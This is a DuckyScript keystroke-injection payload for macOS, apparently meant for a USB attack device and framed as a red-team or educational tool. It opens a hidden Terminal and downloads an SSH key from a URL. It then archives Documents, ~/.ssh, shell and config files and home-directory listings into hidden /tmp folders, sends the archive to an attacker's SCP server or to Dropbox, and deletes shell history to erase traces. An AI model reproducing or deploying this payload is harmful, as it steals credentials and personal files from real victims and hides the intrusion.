REM Title: MacOS Evidence Looter
REM Author: un1x01d
REM Description: The script will compress the Desktop and Documents folders in a hidden location, afterwhich the file will be uploaded to an SCP server an deleted.
REM Notes: This script was created to help with a red-team engagements requiring actual data as evidence. This payload has been created ONLY for educational purposes.
REM Target: MacOS 11.0+ (Built-in ssh/scp)
REM Version: 1.1

REM DELAY 100
REM GUI m
DELAY 500
GUI SPACE
DELAY 200
STRING Terminal
DELAY 100
ENTER

REM ##############################################################
REM # Shrink and move the console window to the top right corner #
REM ##############################################################
DELAY 300
STRING osascript -e 'tell application "Terminal" to set bounds of front window to {2500, 50, 20, 20}' ; clear &&
ENTER
DELAY 300
STRING clear
ENTER

REM #################################################
REM # Download the ssh private key from the set URL #
REM #################################################
STRING mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://<url to private key> -o /tmp/.s/.t/.e/.a/.l/.s && chmod 600 /tmp/.s/.t/.e/.a/.l/.s && clear
ENTER
DELAY 300

REM ###################################################################################################
REM # Compress the looted files.                                                                      #
REM # In this configuration a list of the home directory and the Downloads directories is generated   #
REM # The most common loot paths are ~/Desktop and ~/Documents, so they are added by default.          #
REM ###################################################################################################
STRING cd /tmp/.s/.t/.e/.a/.l && clear && \
DELAY 200
ENTER
STRING find . ~/Downloads >> Downloads.list && find ~/ >> home_dir_file_list.txt && tar cfz .loot.tgz ~/Documents ~/.ssh ~/.bash* ~/.config ~/.zsh* Downloads.list home_dir_file_list.txt &
DELAY 200
ENTER

REM ##########################################################################################################################################################################
REM # SCP the looted files to the attackers SCP server. Delete the looted files and all traces. (This will delete the history and history files to avoid leaving any traces) #
REM # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- #
REM # NOTE: The payload is configured to use SSH as the protcol for the file transfer by default. You can use a different method using DropBox to upload the loot            #
REM ##########################################################################################################################################################################

REM ## The SCP way ##
REM ## Usage: Replace the <port>, <attaccker username>, <attacker hostname> and <remote storage path> with the credentials, hostname and path on the remote SCP server   
REM ------------------------------------------------------------------------------------------------------------------------------------------------------------------
STRING wait %1 && clear && scp -q -P <port> -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz <ssh username>@<attacker hostname>:<remote storage path> \ 
ENTER 
DELAY 300
STRING set -e && rm -rf /tmp/.s ~/.bash_hstory ~/.zsh_history && history -c && exit
ENTER


REM ## The Dropbox way ##
REM ## Usage: Replace the <ACCESS TOKEN> field with you access token, and replace the <DROPBOX DIRECTORY> field with the path where to store the looted file. 
REM ---------------------------------------------------------------------------------------------------------------------------------------------------------
REM STRING wait %1 && clear && curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer <ACCESS_TOKEN>" --header "Dropbox-API-Arg: {\"path\": \"/<DROPBOX DIRECTORY>\"}" --header "Content-Type: application/octet-stream" --data-binary @/tmp/.s/.t/.e/.a/.l/.loot.tgz
DELAY 100
REM ENTER
REM DELAY 300
REM STRING set -e && rm -rf /tmp/.s ~/.bash_hstory ~/.zsh_history && history -c && clear && exit
REM ENTER


REM #####################################
REM # Minimize the window during upload #
REM #####################################
DELAY 500
GUI m
DELAY 200
GUI TAB
